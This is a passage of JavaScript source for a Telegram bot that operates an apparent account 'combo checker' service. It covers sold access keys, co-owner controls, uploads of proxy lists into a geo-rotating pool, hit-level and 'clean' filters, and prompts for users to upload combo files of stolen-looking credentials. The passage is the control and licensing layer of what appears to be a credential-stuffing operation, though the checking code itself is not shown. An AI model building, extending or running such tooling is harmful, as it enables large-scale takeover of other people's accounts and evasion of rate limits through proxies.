      `<i>Use /keysystem status to test the connection.</i>`
    );
    return;
  }

  if (subcmd === 'secret') {
    if (!value) {
      tgSend(token, chatId, '❌ Provide the secret: <code>/keysystem secret YOUR_SECRET</code>');
      return;
    }
    const cfg = config.loadConfig() || {};
    cfg.keysystem_admin_secret = value;
    config.saveConfig(cfg);
    api.reloadConfig();
    resetKeySystemAPI();
    tgSend(token, chatId,
      `✅ <b>Admin secret updated!</b>\n\n` +
      `<i>Use /keysystem status to test the connection.</i>`
    );
    return;
  }

  if (subcmd === 'status') {
    if (!api.enabled) {
      tgSend(token, chatId,
        '❌ <b>KeyVault not configured.</b>\n\n' +
        'Set the URL first: <code>/keysystem url https://your-app.vercel.app</code>'
      );
      return;
    }
    (async () => {
      try {
        const resp = await axios.get(
          `${api.base_url}/api/keys/list`,
          { headers: api._headers(), timeout: 10000 }
        );
        if (resp.status === 200) {
          const keyCount = Array.isArray(resp.data) ? resp.data.length : 0;
          tgSend(token, chatId,
            `✅ <b>KeyVault Connected!</b>\n\n` +
            `📡 ${api.base_url}\n` +
            `🔑 ${keyCount} key(s) in remote store\n\n` +
            `<i>Keys generated with /generate_key will now sync to KeyVault.</i>`
          );
        } else if (resp.status === 401) {
          tgSend(token, chatId,
            '🔐 <b>Authentication failed.</b>\n\n' +
            'Check your admin secret: <code>/keysystem secret YOUR_SECRET</code>'
          );
        } else {
          tgSend(token, chatId,
            `⚠️ <b>Unexpected response:</b> HTTP ${resp.status}\n\n` +
            `<code>${String(resp.data).slice(0, 200)}</code>`
          );
        }
      } catch (e) {
        tgSend(token, chatId,
          `❌ <b>Connection failed:</b>\n\n` +
          `<code>${e.message.slice(0, 200)}</code>\n\n` +
          `Check the URL: <code>/keysystem url ...</code>`
        );
      }
    })();
    return;
  }

  tgSend(token, chatId,
    '❌ Unknown sub-command.\n\n' +
    '<b>Usage:</b>\n' +
    '  <code>/keysystem</code> — show config\n' +
    '  <code>/keysystem url &lt;URL&gt;</code> — set API URL\n' +
    '  <code>/keysystem secret &lt;SECRET&gt;</code> — set admin secret\n' +
    '  <code>/keysystem status</code> — test connection'
  );
}

// ── Handle proxy upload ────────────────────────────────────────────────
async function handleProxyUpload(token, chatId, fromUser, msg) {
  const doc = msg?.document;
  if (doc) {
    const fileId = doc.file_id;
    const tmpPath = path.join(config.PROXY_DIR, `upload_${Date.now()}.txt`);
    const downloadResult = await tgDownloadFile(token, fileId, tmpPath);
    if (downloadResult) {
      const content = fs.readFileSync(tmpPath, 'utf-8');
      const lines = preprocessProxyText(content);
      const result = saveProxiesFromLines(lines);
      if (result) {
        geoRotator.reload();
        clearNoProxyWarning();
        persistProxies();
        tgSend(token, chatId,
          `✅ <b>Proxy file uploaded!</b>\n\n` +
          `📊 ${lines.length} lines processed\n` +
          `📡 Total proxies: <b>${geoRotator.total}</b>`);
      } else {
        tgSend(token, chatId, '❌ <b>No valid proxy lines found in file.</b>');
      }
      try { fs.unlinkSync(tmpPath); } catch {}
    } else {
      tgSend(token, chatId, '❌ <b>Failed to download proxy file.</b>');
    }
    return;
  }

  const text = msg?.text || '';
  if (!text || text.startsWith('/')) {
    tgSendButtons(token, chatId,
      '📡 <b>Proxy Upload</b>\n\nSend proxy lines or a file.\nYou can send multiple messages.',
      [
        [
          { text: '✅ Done (save all)', callback_data: 'proxy:done' },
          { text: '🗑 Clear & Cancel',  callback_data: 'proxy:cancel' },
        ],
      ]
    );
    return;
  }

  if (!proxyAccumulator[chatId]) proxyAccumulator[chatId] = [];
  const lines = text.split('\n');
  for (const line of lines) {
    const normalized = normalizeProxyLine(line);
    if (normalized) proxyAccumulator[chatId].push(normalized);
  }

  const count = proxyAccumulator[chatId].length;
  tgSendButtons(token, chatId,
    `📡 <b>${count} proxy line(s) received.</b>\n\nKeep sending more or tap Done:`,
    [
      [
        { text: '✅ Done (save all)', callback_data: 'proxy:done' },
        { text: '🗑 Clear & Cancel',  callback_data: 'proxy:cancel' },
      ],
    ]
  );
}

// ── Build stop keyboard ────────────────────────────────────────────────
function buildStopKeyboard(includeStopAll = false) {
  const keyboard = [];
  for (const [chatId, evt] of Object.entries(stopEvents)) {
    if (!evt.isSet()) {
      const bar = activeBars[chatId];
      const done  = bar?.done || 0;
      const total = bar?.total || 0;
      const pct = total > 0 ? `${(done/total*100).toFixed(1)}%` : '—';
      const saved = getSavedProfile(chatId);
      const label = saved?.username ? `@${saved.username}` : `id:${chatId}`;
      keyboard.push([{
        text: `🛑 Stop ${label} (${pct})`,
        callback_data: `stop_user:${chatId}`
      }]);
    }
  }

  if (includeStopAll && keyboard.length > 0) {
    keyboard.push([{ text: '☢️ Stop ALL', callback_data: 'stop_all' }]);
  }
  if (keyboard.length > 0) {
    keyboard.push([{ text: '❌ Keep running', callback_data: 'stop_cancel' }]);
  }

  const activeCount = Object.values(stopEvents).filter(e => !e.isSet()).length;
  return [keyboard, activeCount];
}

// ── Handle stop panel ──────────────────────────────────────────────────
function handleStopPanel(token, chatId, fromUser) {
  if (isOwner(fromUser)) {
    const [kb, count] = buildStopKeyboard(true);
    const text = count > 0
      ? `🛑 <b>Running Checkers (${count})</b>\n\nSelect one to stop:`
      : 'ℹ️ <b>No checkers are currently running.</b>';
    if (kb.length) {
      tgSendButtons(token, chatId, text, kb);
    } else {
      tgSend(token, chatId, text);
    }
  } else {
    const evt = stopEvents[chatId];
    if (evt && !evt.isSet()) {
      const bar = activeBars[chatId] || {};
      const done  = bar.done || 0;
      const total = bar.total || 0;
      const pct = total > 0 ? `${(done/total*100).toFixed(1)}%` : '—';
      tgSendButtons(token, chatId,
        `🛑 <b>Your checker is running</b>\n\n📊 Progress: <code>${done}/${total}</code> (${pct})\n\nTap below to stop it:`,
        [
          [{ text: `🛑 Stop my checker (${pct})`, callback_data: `stop_user:${chatId}` }],
          [{ text: '❌ Keep running', callback_data: 'stop_cancel' }],
        ]
      );
    } else {
      tgSend(token, chatId, 'ℹ️ <b>No checker is currently running.</b>');
    }
  }
}

// ── Handle callback query ──────────────────────────────────────────────
async function handleCallbackQuery(token, cq) {
  const cqId = cq.id;
  const fromUser = cq.from || {};
  const message = cq.message;
  const data = cq.data || '';

  tgAnswerCallback(token, cqId);

  if (!message) return;
  const chatId = message.chat?.id;
  if (!chatId) return;

  console.log(`[BOT] 🔘 callback data=${data} from=${fromUser.id} chat=${chatId}`);

  // ── Admin panel buttons ─────────────────────────────────────────────
  if (data === 'admin:genkey') {
    if (!isOwner(fromUser)) return;
    genkeyWizard[chatId] = { step: 'AWAIT_DURATION' };
    tgSendButtons(token, chatId,
      '🔑 <b>Generate Key — Step 1 of 4</b>\n\n⏳ How long should the key be valid?\n\n<i>Tap a button or type a custom duration</i>',
      [
        [
          { text: '1 Hour',   callback_data: 'gk_dur:3600' },
          { text: '6 Hours',  callback_data: 'gk_dur:21600' },
          { text: '12 Hours', callback_data: 'gk_dur:43200' },
        ],
        [
          { text: '1 Day',    callback_data: 'gk_dur:86400' },
          { text: '3 Days',   callback_data: 'gk_dur:259200' },
          { text: '7 Days',   callback_data: 'gk_dur:604800' },
        ],
        [
          { text: '30 Days',  callback_data: 'gk_dur:2592000' },
          { text: '❌ Cancel', callback_data: 'gk_cancel' },
        ],
      ]
    );
    return;
  }

  if (data === 'admin:statuskey') {
    if (!isOwner(fromUser)) return;
    handleStatusKey(token, chatId, '');
    return;
  }

  if (data === 'admin:deletekey_menu') {
    if (!isOwner(fromUser)) return;
    const keys = loadKeys();
    if (!Object.keys(keys).length) {
      tgSend(token, chatId, '📊 <b>No keys found.</b>');
      return;
    }
    deleteKeySelection[chatId] = new Set();
    const now = Date.now() / 1000;
    tgSendButtons(token, chatId,
      deleteKeyHeader(keys, deleteKeySelection[chatId], now),
      buildDeleteKeyKeyboard(keys, deleteKeySelection[chatId], now)
    );
    return;
  }

  if (data === 'admin:serverstatus') {
    if (!isOwner(fromUser)) return;
    handleServerStatus(token, chatId);
    return;
  }

  if (data === 'admin:proxystatus') {
    if (!isOwner(fromUser)) return;
    handleProxyStatus(token, chatId);
    return;
  }

  if (data === 'admin:upload_proxy') {
    if (!isOwner(fromUser)) return;
    delete proxyAccumulator[chatId];
    delete proxyMsgIds[chatId];
    botState[chatId] = 'AWAIT_PROXY';
    handleProxyUpload(token, chatId, fromUser, {});
    return;
  }

  if (data === 'admin:keysystem') {
    if (!isOwner(fromUser)) return;
    handleKeySystemConfig(token, chatId, fromUser, '');
    return;
  }

  if (data === 'admin:refresh') {
    if (!isOwner(fromUser)) return;
    handleHelp(token, chatId, fromUser);
    return;
  }

  // ── Delete key picker ────────────────────────────────────────────────
  if (data.startsWith('dk_toggle:')) {
    if (!isOwner(fromUser)) return;
    const keyName = data.slice('dk_toggle:'.length);
    const sel = deleteKeySelection[chatId] || new Set();
    if (sel.has(keyName)) sel.delete(keyName); else sel.add(keyName);
    deleteKeySelection[chatId] = sel;
    const keys = loadKeys();
    const now = Date.now() / 1000;
    tgEditMessage(token, chatId, message.message_id,
      deleteKeyHeader(keys, sel, now),
      buildDeleteKeyKeyboard(keys, sel, now));
    return;
  }

  if (data.startsWith('dk_sel:')) {
    if (!isOwner(fromUser)) return;
    const action = data.slice('dk_sel:'.length);
    const keys = loadKeys();
    const now = Date.now() / 1000;
    const sel = deleteKeySelection[chatId] || new Set();
    if (action === 'expired') {
      for (const [k, v] of Object.entries(keys)) {
        if (now >= (v.expires || 0)) sel.add(k);
      }
    } else if (action === 'unused') {
      for (const [k, v] of Object.entries(keys)) {
        if (!v.used_by?.length) sel.add(k);
      }
    } else if (action === 'all') {
      for (const k of Object.keys(keys)) sel.add(k);
    } else if (action === 'none') {
      sel.clear();
    }
    deleteKeySelection[chatId] = sel;
    tgEditMessage(token, chatId, message.message_id,
      deleteKeyHeader(keys, sel, now),
      buildDeleteKeyKeyboard(keys, sel, now));
    return;
  }

  if (data === 'dk_confirm') {
    if (!isOwner(fromUser)) return;
    const sel = deleteKeySelection[chatId] || new Set();
    if (!sel.size) {
      tgAnswerCallback(token, cqId, '⚠️ No keys selected!');
      return;
    }
    const keys = loadKeys();
    const deleted = [];
    for (const k of sel) {
      if (keys[k]) { deleted.push(k); delete keys[k]; }
    }
    saveKeys(keys);
    tgEditMessage(token, chatId, message.message_id,
      `🗑 <b>Deleted ${deleted.length} key(s)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      deleted.map(k => `  🔑 <code>${k}</code>`).join('\n') +
      `\n\n📊 <b>Remaining keys: ${Object.keys(keys).length}</b>`, []);
    delete deleteKeySelection[chatId];
    return;
  }

  if (data === 'dk_cancel') {
    if (!isOwner(fromUser)) return;
    delete deleteKeySelection[chatId];
    tgEditMessage(token, chatId, message.message_id,
      '❌ <b>Delete cancelled.</b> No keys were removed.', []);
    return;
  }

  if (data === 'dk_noop') return;

  // ── Genkey wizard ────────────────────────────────────────────────────
  if (data.startsWith('gk_dur:')) {
    if (!isOwner(fromUser)) return;
    const duration = parseInt(data.split(':')[1]);
    genkeyWizard[chatId] = { step: 'AWAIT_USERS', duration };
    askGenkeyUsers(token, chatId, duration);
    return;
  }

  if (data.startsWith('gk_usr:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_USERS') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    wiz.max_users = parseInt(data.split(':')[1]);
    wiz.step = 'AWAIT_LIMIT';
    askGenkeyLimit(token, chatId, wiz.duration, wiz.max_users);
    return;
  }

  if (data.startsWith('gk_lim:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_LIMIT') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    wiz.combo_limit = parseInt(data.split(':')[1]);
    wiz.step = 'AWAIT_COUNT';
    askGenkeyCount(token, chatId, wiz.duration, wiz.max_users, wiz.combo_limit);
    return;
  }

  if (data.startsWith('gk_cnt:')) {
    if (!isOwner(fromUser)) return;
    const wiz = genkeyWizard[chatId];
    if (!wiz || wiz.step !== 'AWAIT_COUNT') {
      tgSend(token, chatId, '⚠️ Session expired. Use /generate_key again.');
      return;
    }
    const count = parseInt(data.split(':')[1]);
    finalizeGenKey(token, chatId, wiz.duration, wiz.combo_limit, count, wiz.max_users);
    return;
  }

  if (data === 'gk_cancel') {
    delete genkeyWizard[chatId];
    tgSend(token, chatId, '❌ Key generation cancelled.');
    return;
  }

  // ── User menu buttons ────────────────────────────────────────────────
  if (data === 'user:start') {
    if (!checkAccessGate(token, chatId, fromUser)) return;
    handleStart(token, chatId, fromUser);
    return;
  }

  if (data === 'user:reset') {
    const keyId = String(fromUser.id || chatId);
    const uname = fromUser.username || '';
    delete savedUsers[keyId];
    if (uname) delete savedUsers[uname.toLowerCase().replace('@', '')];
    saveUsersToDisk();
    delete userData[chatId];
    delete botState[chatId];
    tgSend(token, chatId, '🗑 <b>Settings cleared!</b>\n\nSend /start or tap Start to reconfigure.');
    return;
  }

  if (data === 'user:stop') {
    handleStopPanel(token, chatId, fromUser);
    return;
  }

  // ── Stop buttons ────────────────────────────────────────────────────
  if (data.startsWith('stop_user:')) {
    const targetId = parseInt(data.split(':')[1]);
    if (!isOwner(fromUser) && targetId !== chatId) {
      tgAnswerCallback(token, cqId, '🚫 You can only stop your own checker.');
      return;
    }
    const evt = stopEvents[targetId];
    if (evt && !evt.isSet()) {
      evt.set();
      const saved = getSavedProfile(String(targetId));
      const label = saved?.username ? `@${saved.username}` : `id:${targetId}`;
      tgEditMessage(token, chatId, message.message_id,
        `🛑 <b>Stop signal sent to ${label}!</b>\n\nThe checker will stop after the current batch finishes.`, []);
    } else {
      tgEditMessage(token, chatId, message.message_id,
        'ℹ️ <b>That checker has already finished or stopped.</b>', []);
    }
    return;
  }

  if (data === 'stop_all') {
    if (!isOwner(fromUser)) {
      tgAnswerCallback(token, cqId, '🚫 Owner only.');
      return;
    }
    let stoppedCount = 0;
    for (const [tid, evt] of Object.entries(stopEvents)) {
      if (!evt.isSet()) { evt.set(); stoppedCount++; }
    }
    tgEditMessage(token, chatId, message.message_id,
      `☢️ <b>Stop ALL sent!</b>\n\nSent stop signal to <b>${stoppedCount}</b> running checker(s).\nThey will stop after their current batch finishes.`, []);
    return;
  }

  if (data === 'stop_cancel') {
    tgEditMessage(token, chatId, message.message_id,
      '✅ <b>Cancelled.</b> Checkers keep running.', []);
    return;
  }

  if (data === 'user:redeem') {
    tgSend(token, chatId, '🔑 <b>Redeem Key</b>\n\nType your key:\n<code>/redeem YOUR_KEY</code>');
    return;
  }

  if (data === 'user:refresh_help') {
    handleHelp(token, chatId, fromUser);
    return;
  }

  if (data === 'redeem:prompt') {
    botState[chatId] = 'AWAIT_REDEEM_KEY';
    tgSend(token, chatId,
      '🔑 <b>Enter your key:</b>\n\n<code>/redeem YOUR_KEY_HERE</code>\n\n<i>Just type it and send!</i>');
    return;
  }

  // ── Level picker ────────────────────────────────────────────────────
  if (data.startsWith('lvl:')) {
    if (!checkAccessGate(token, chatId, fromUser)) return;
    const val = data.slice(4);
    const levelMap = {
      '100': ([100], 'Level 100+'),
      '200': ([200], 'Level 200+'),
      '300': ([300], 'Level 300+'),
      '400': ([400], 'Level 400+'),
      'all': ([1],   'ALL levels'),
    };
    if (!levelMap[val]) return;
    const [thresholds, label] = levelMap[val];
    const d = udata(chatId);
    d.level = thresholds;
    askFilter(token, chatId, label);
    return;
  }

  // ── Filter picker ───────────────────────────────────────────────────
  if (data.startsWith('flt:')) {
    if (!checkAccessGate(token, chatId, fromUser)) return;
    const val = data.slice(4);
    const filterMap = {
      'clean':    ('clean',    '✅ CLEAN only'),
      'notclean': ('notclean', '❌ NOT CLEAN only'),
      'both':     ('both',     '🔄 BOTH'),
    };
    if (!filterMap[val]) return;
    const [cfValue, cfLabel] = filterMap[val];
    const d = udata(chatId);
    d.clean_filter = cfValue;
    botState[chatId] = 'AWAIT_FILE';
    saveProfile(chatId, d);

    const lvlLabel  = d.level?.[0] === 1 ? 'ALL levels' : `Level ${d.level?.[0]}+`;
    const userLimit = d.combo_limit || config.COMBO_LINE_LIMIT;

    tgSend(token, chatId,
      `✅ <b>Config saved!</b>\n\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `  🔑 Hits ID:  <code>${d.hits_id || chatId}</code>\n` +
      `  🎮 Level:    <code>${lvlLabel}</code>\n` +
      `  🔍 Hit type: <code>${cfLabel}</code>\n` +
      `  📦 Limit:    <code>${userLimit} lines</code>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      `📂 <b>Upload your combo file to start!</b>\n\n` +
      `<i>Use /reset to change settings.</i>\n\n` +
      `<i>Send your file now ⬇️</i>`
    );
    return;
  }

  // ── Proxy accumulator buttons ───────────────────────────────────────
  if (data === 'proxy:done') {
    if (!isOwner(fromUser)) return;
    const result = flushProxyAccumulator(chatId, proxyAccumulator, proxyMsgIds);
    if (result) {
      geoRotator.reload();
      clearNoProxyWarning();
      persistProxies();
      tgSend(token, chatId,
        `✅ <b>Proxies saved!</b>\n\n📊 ${result.count} lines\n📡 Total: <b>${geoRotator.total}</b>`);
    } else {
      tgSend(token, chatId, '❌ <b>No proxy lines to save.</b>');
    }
    delete botState[chatId];
    return;
  }

  if (data === 'proxy:cancel') {
    if (!isOwner(fromUser)) return;
    const msgIds = proxyMsgIds[chatId] || [];
    delete proxyAccumulator[chatId];
    delete proxyMsgIds[chatId];
    delete botState[chatId];
    if (msgIds.length) tgDeleteMessagesBulk(token, chatId, msgIds);
    tgSend(token, chatId, '🗑 <b>Proxy upload cancelled.</b> Accumulator cleared.');
    return;
  }
}

// ── Parse command ──────────────────────────────────────────────────────
function parseCommand(text) {
  if (!text || !text.startsWith('/')) return ['', text];
  const parts = text.split(/\s+/);
  let cmd = parts[0].toLowerCase().slice(1);
  if (cmd.includes('@')) cmd = cmd.split('@')[0];
  const args = parts.slice(1).join(' ').trim();
  return [cmd, args];
}

// ── Handle bot update (main message/command router) ───────────────────
async function handleBotUpdate(token, update) {
  try {
    if (update.callback_query) {
      await handleCallbackQuery(token, update.callback_query);
      return;
    }

    const msg = update.message || update.edited_message;
    if (!msg) return;

    const chatId   = msg.chat?.id;
    const fromUser = msg.from || {};
    const text     = (msg.text || '').trim();
    const [cmd, cmdArgs] = parseCommand(text);

    if (cmd) {
      console.log(`[BOT] 📩 cmd=${cmd} args=${cmdArgs} from=${fromUser.id} chat=${chatId}`);
    }

    // ── Intercept text replies for genkey wizard ──────────────────────
    if (isOwner(fromUser) && genkeyWizard[chatId]) {
      const wiz = genkeyWizard[chatId];
      if (wiz.step === 'AWAIT_DURATION' && text && !text.startsWith('/')) {
        const dur = parseDuration(text);
        if (dur > 0) {
          wiz.step = 'AWAIT_USERS';
          wiz.duration = dur;
          askGenkeyUsers(token, chatId, dur);
        } else {
          tgSend(token, chatId, '❌ Invalid format. Try: <code>1d</code>  <code>12hrs</code>  <code>45min</code>');
        }
        return;
      }
      if (wiz.step === 'AWAIT_USERS' && text && !text.startsWith('/')) {
        const maxUsers = parseInt(text.trim());
        if (isNaN(maxUsers) || maxUsers < 0) {
          tgSend(token, chatId, '❌ Enter a number (e.g. <code>10</code>) or <code>0</code> for unlimited.');
          return;
        }
        wiz.step = 'AWAIT_LIMIT';
        wiz.max_users = maxUsers;
        askGenkeyLimit(token, chatId, wiz.duration, maxUsers);
        return;
      }
      if (wiz.step === 'AWAIT_LIMIT' && text && !text.startsWith('/')) {
        const limit = parseInt(text.trim());
        if (isNaN(limit) || limit < 0) {
          tgSend(token, chatId, '❌ Please enter a valid number (e.g. <code>1000</code>) or <code>0</code> for unlimited.');
          return;
        }
        wiz.step = 'AWAIT_COUNT';
        wiz.combo_limit = limit;
        askGenkeyCount(token, chatId, wiz.duration, wiz.max_users, limit);
        return;
      }
      if (wiz.step === 'AWAIT_COUNT' && text && !text.startsWith('/')) {
        const count = parseInt(text.trim());
        if (isNaN(count) || count < 1 || count > 500) {
          tgSend(token, chatId, '❌ Enter a number between <code>1</code> and <code>500</code>.');
          return;
        }
        finalizeGenKey(token, chatId, wiz.duration, wiz.combo_limit, count, wiz.max_users);
        return;
      }
    }

    // ── /stop ─────────────────────────────────────────────────────────
    if (cmd === 'stop') {
      handleStopPanel(token, chatId, fromUser);
      return;
    }

    // ── /help ─────────────────────────────────────────────────────────
    if (cmd === 'help') {
      handleHelp(token, chatId, fromUser);
      return;
    }

    // ── Owner-only commands ───────────────────────────────────────────
    if (cmd === 'generate_key') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      genkeyWizard[chatId] = { step: 'AWAIT_DURATION' };
      tgSendButtons(token, chatId,
        '🔑 <b>Generate Key — Step 1 of 4</b>\n\n⏳ How long should the key be valid?\n\n<i>Tap a button or type a custom duration</i>',
        [
          [
            { text: '1 Hour',   callback_data: 'gk_dur:3600' },
            { text: '6 Hours',  callback_data: 'gk_dur:21600' },
            { text: '12 Hours', callback_data: 'gk_dur:43200' },
          ],
          [
            { text: '1 Day',    callback_data: 'gk_dur:86400' },
            { text: '3 Days',   callback_data: 'gk_dur:259200' },
            { text: '7 Days',   callback_data: 'gk_dur:604800' },
          ],
          [
            { text: '30 Days',  callback_data: 'gk_dur:2592000' },
            { text: '❌ Cancel', callback_data: 'gk_cancel' },
          ],
        ]
      );
      return;
    }

    if (cmd === 'upload_proxy') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      delete proxyAccumulator[chatId];
      delete proxyMsgIds[chatId];
      botState[chatId] = 'AWAIT_PROXY';
      handleProxyUpload(token, chatId, fromUser, msg);
      return;
    }

    if (cmd === 'proxy_done') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      if (proxyAccumulator[chatId]?.length) {
        const userMsgId = msg.message_id;
        if (userMsgId) {
          if (!proxyMsgIds[chatId]) proxyMsgIds[chatId] = [];
          proxyMsgIds[chatId].push(userMsgId);
        }
        const result = flushProxyAccumulator(chatId, proxyAccumulator, proxyMsgIds);
        if (result) {
          geoRotator.reload();
          clearNoProxyWarning();
          persistProxies();
          tgSend(token, chatId,
            `✅ <b>Proxies saved!</b>\n\n📊 ${result.count} lines\n📡 Total: <b>${geoRotator.total}</b>`);
        }
        delete botState[chatId];
      } else {
        tgSend(token, chatId,
          '📊 <b>No proxy lines to save.</b>\n\nUse /upload_proxy first to paste proxy lines, then /proxy_done to save them.');
      }
      return;
    }

    if (cmd === 'proxystatus') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleProxyStatus(token, chatId);
      return;
    }

    if (cmd === 'add_coowner') {
      if (!isPrimaryOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Primary owner only command.</b>');
        return;
      }
      if (!cmdArgs) {
        const coowners = config.getCoownerIds();
        const colist = coowners.length
          ? coowners.map(uid => `  • <code>${uid}</code>`).join('\n')
          : '  <i>None</i>';
        tgSend(token, chatId,
          `👥 <b>Co-Owner Management</b>\n\n━━━━━━━━━━━━━━━━━━━━━━━━\n📋 <b>Current co-owners:</b>\n${colist}\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n<b>Usage:</b>\n<code>/add_coowner 123456789</code> — add a co-owner\n<code>/remove_coowner 123456789</code> — remove a co-owner`);
        return;
      }
      const coUid = parseInt(cmdArgs);
      if (isNaN(coUid)) {
        tgSend(token, chatId, '❌ <b>Invalid ID.</b> Use a numeric Telegram user ID.');
        return;
      }
      if (coUid === config.getOwnerId()) {
        tgSend(token, chatId, "⚠️ That's already the primary owner ID.");
        return;
      }
      if (config.getCoownerIds().includes(coUid)) {
        tgSend(token, chatId, `ℹ️ <code>${coUid}</code> is already a co-owner.`);
        return;
      }
      config.addCoowner(coUid);
      tgSend(token, chatId,
        `✅ <b>Co-owner added!</b>\n\n🔑 <code>${coUid}</code> now has owner-level access.\n👥 Total co-owners: <b>${config.getCoownerIds().length}</b>`);
      return;
    }

    if (cmd === 'remove_coowner') {
      if (!isPrimaryOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Primary owner only command.</b>');
        return;
      }
      if (!cmdArgs) {
        const coowners = config.getCoownerIds();
        const colist = coowners.length
          ? coowners.map(uid => `  • <code>${uid}</code>`).join('\n')
          : '  <i>None</i>';
        tgSend(token, chatId,
          `👥 <b>Remove Co-Owner</b>\n\n📋 <b>Current co-owners:</b>\n${colist}\n\n<b>Usage:</b> <code>/remove_coowner 123456789</code>`);
        return;
      }
      const coUid = parseInt(cmdArgs);
      if (isNaN(coUid)) {
        tgSend(token, chatId, '❌ <b>Invalid ID.</b>');
        return;
      }
      if (!config.getCoownerIds().includes(coUid)) {
        tgSend(token, chatId, `ℹ️ <code>${coUid}</code> is not a co-owner.`);
        return;
      }
      config.removeCoowner(coUid);
      tgSend(token, chatId,
        `✅ <b>Co-owner removed!</b>\n\n🔑 <code>${coUid}</code> no longer has owner access.\n👥 Remaining co-owners: <b>${config.getCoownerIds().length}</b>`);
      return;
    }

    if (cmd === 'serverstatus') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleServerStatus(token, chatId);
      return;
    }

    if (cmd === 'resetconfig') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      const cfgPath = config.CONFIG_FILE;
      if (fs.existsSync(cfgPath)) fs.unlinkSync(cfgPath);
      tgSend(token, chatId, '🗑 <b>Config deleted!</b>\n\nRestart the bot — it will ask for your token and owner ID again.');
      return;
    }

    if (cmd === 'stopall') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      let stoppedCount = 0;
      for (const [tid, evt] of Object.entries(stopEvents)) {
        if (!evt.isSet()) { evt.set(); stoppedCount++; }
      }
      if (stoppedCount) {
        tgSend(token, chatId, `☢️ <b>Stop ALL sent!</b>\n\nSent stop signal to <b>${stoppedCount}</b> running checker(s).`);
      } else {
        tgSend(token, chatId, 'ℹ️ No checkers are currently running.');
      }
      return;
    }

    if (cmd === 'statuskey') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleStatusKey(token, chatId, cmdArgs);
      return;
    }

    if (cmd === 'deletekey') {
      if (!isOwner(fromUser)) {
        tgSend(token, chatId, '🚫 <b>Owner only command.</b>');
        return;
      }
      handleDeleteKey(token, chatId, fromUser, cmdArgs);
      return;
    }

    if (cmd === 'keysystem') {
      handleKeySystemConfig(token, chatId, fromUser, cmdArgs);
      return;
    }

    // ── Proxy file upload state ───────────────────────────────────────
    if (botState[chatId] === 'AWAIT_PROXY') {
      if (msg.document) {
        delete proxyMsgIds[chatId];
        await handleProxyUpload(token, chatId, fromUser, msg);
        delete botState[chatId];
      } else if (cmd === 'done' || cmd === 'proxy_done' || text.toLowerCase() === 'done') {
        const userMsgId = msg.message_id;
        if (userMsgId) {
          if (!proxyMsgIds[chatId]) proxyMsgIds[chatId] = [];
          proxyMsgIds[chatId].push(userMsgId);
        }
        const result = flushProxyAccumulator(chatId, proxyAccumulator, proxyMsgIds);
        if (result) {
          geoRotator.reload();
          clearNoProxyWarning();
          persistProxies();
          tgSend(token, chatId,
            `✅ <b>Proxies saved!</b>\n\n📊 ${result.count} lines\n📡 Total: <b>${geoRotator.total}</b>`);
        }
        delete botState[chatId];
      } else if (text && !text.startsWith('/')) {
        await handleProxyUpload(token, chatId, fromUser, msg);
      } else {
        tgSendButtons(token, chatId,
          '📡 Keep sending proxy lines, or tap Done when finished.',
          [
            [
              { text: '✅ Done (save all)', callback_data: 'proxy:done' },
              { text: '🗑 Clear & Cancel',  callback_data: 'proxy:cancel' },
            ],
          ]
        );
      }
      return;
    }

    // ── /start — always allowed ───────────────────────────────────────
    if (cmd === 'start') {
      handleStart(token, chatId, fromUser);
      return;
    }

    // ── /reset — always allowed ───────────────────────────────────────
    if (cmd === 'reset') {
      const keyId = String(fromUser.id || chatId);
      const uname = fromUser.username || '';
      delete savedUsers[keyId];
      if (uname) delete savedUsers[uname.toLowerCase().replace('@', '')];
      saveUsersToDisk();
      delete userData[chatId];
      delete botState[chatId];
      tgSend(token, chatId, '🗑 <b>Settings cleared!</b>\n\nSend /start to choose your level and hit type again.');
      return;
    }

    // ── /redeem — always allowed ──────────────────────────────────────
    if (cmd === 'redeem') {
      handleRedeem(token, chatId, fromUser, cmdArgs);
      return;
    }

    // ── AWAIT_REDEEM_KEY state ────────────────────────────────────────
    if (botState[chatId] === 'AWAIT_REDEEM_KEY') {
      if (text && !text.startsWith('/')) {
        delete botState[chatId];
        handleRedeem(token, chatId, fromUser, text.trim());
      } else if (cmd === 'redeem') {
        delete botState[chatId];
        handleRedeem(token, chatId, fromUser, cmdArgs);
      } else {
        tgSend(token, chatId, '🔑 Just type your key and send it, or use:\n<code>/redeem YOUR_KEY</code>');
      }
      return;
    }

    // ── Access gate ───────────────────────────────────────────────────
    if (!checkAccessGate(token, chatId, fromUser)) return;

    // ── Auto-restore saved profile ────────────────────────────────────
    if (!(chatId in botState)) {
      const tgId  = fromUser.id || chatId;
      const uname = fromUser.username || '';
      const saved = getSavedProfile(String(tgId)) ||
        (uname ? getSavedProfile(uname.toLowerCase()) : null);
      if (saved) {
        const d = udata(chatId);
        d.hits_id      = saved.hits_id;
        d.username     = saved.username || uname;
        d.level        = saved.level;
        d.clean_filter = saved.clean_filter;
        d.key          = saved.key;
